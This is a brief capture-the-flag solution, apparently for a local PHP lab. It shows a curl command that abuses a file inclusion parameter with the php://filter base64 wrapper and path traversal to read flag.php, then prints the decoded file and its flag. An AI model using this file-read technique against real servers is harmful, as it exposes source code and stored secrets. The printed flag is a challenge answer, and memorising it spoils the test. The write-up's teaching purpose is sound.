Use php filter base64-encode to read flag.php file in base64 encoding format, then decode it to have the flag:

```bash
curl http://localhost:8000/pages/page.php?f=php://filter/convert.base64-encode/resource=../somerandomtext/flag.php | base64 -d
```

And the `flag.php` file have the following code:

```php
<?php
    $flag = "flag_bb4e38d4f760c434ee58cfaf9d503437";
?>
```
